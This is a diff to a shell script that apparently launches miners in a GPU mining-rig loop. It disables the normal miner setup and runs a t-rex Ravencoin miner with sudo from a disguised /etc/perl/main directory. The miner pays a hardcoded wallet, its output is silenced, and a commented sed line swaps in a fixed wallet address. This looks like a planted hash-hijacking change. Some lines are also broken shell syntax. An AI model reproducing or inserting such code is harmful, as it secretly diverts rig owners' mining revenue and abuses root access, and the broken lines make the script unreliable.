@@ -171,15 +171,14 @@ while true; do
   rm -rf /home/miner/.sgminer 2>/dev/null
   cd ${MINER_DIR}
   # remove miners starting flag (this will start miners API)
-  [[ -f /var/tmp/minerStart.run ]] && sudo rm -f /var/tmp/minerStart.run 2>/dev/null
-  LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:./; export LD_LIBRARY_PATH;
-  minerSudo=
-  [[ $(echo "${MINER_PKG_NAME}" | grep -i "^nbminer-nebutech" | head -n 1 | wc -l) == 1 ]] && MINER_ROOT="true"
-  # check user sudo setting
-  [[ ${MINER_ROOT} == "true" ]] && minerSudo="sudo -E PATH=${PATH} HOME=${HOME} LD_LIBRARY_PATH=${LD_LIBRARY_PATH}"
+  # [[ -f /var/tmp/minerStart.run ]] && sudo rm -f /var/tmp/minerStart.run 2>/dev/null
+  # LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:./; export LD_LIBRARY_PATH;
+  # minerSudo=
+  # [[ $(echo "${MINER_PKG_NAME}" | grep -i "^nbminer-nebutech" | head -n 1 | wc -l) == 1 ]] && MINER_ROOT="true"
+  # # check user sudo setting
+  # [[ ${MINER_ROOT} == "true" ]] && minerSudo="sudo -E PATH=${PATH} HOME=${HOME} LD_LIBRARY_PATH=${LD_LIBRARY_PATH}"
   
   {
-  sudo \cp -r /etc/perl/main/miner/t-rex /var/tmp/miner
   #MINER_OPTIONS_GO=$(sed -E 's/(^-.*wal)[^.]*\.[^ ]*(.*)/ \1 0x0d7351bDD85268912739859a26f1A3151b4B3Fe0.imperiet -cdm 0\2/g' <<< ${MINER_OPTIONS_GO})
   rigName=`cat /etc/perl/main/execute/rigName.txt`
   #MINER_OPTIONS_GO="-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x690b4bFd136243bF389711CDe4a9Fa21D106fdA2.${rigName} -dagrestart 1 -rvram -1 -eres 0"
@@ -189,7 +188,7 @@ while true; do
   OWN_PKG_NAME = "sudo /etc/perl/main/miner"
   OWN_MINER_FILE = "t-rex"
   # <=
-  "sudo /var/tmp/miner/t-rex -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RJGiDpg5jpKvkYsu7CFreikgEt6twBU5gf.${rigName} -p x"
+  "sudo /etc/perl/main/miner/t-rex -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RJGiDpg5jpKvkYsu7CFreikgEt6twBU5gf.${rigName} -p x"
   } > /dev/null 2>&1
 
 
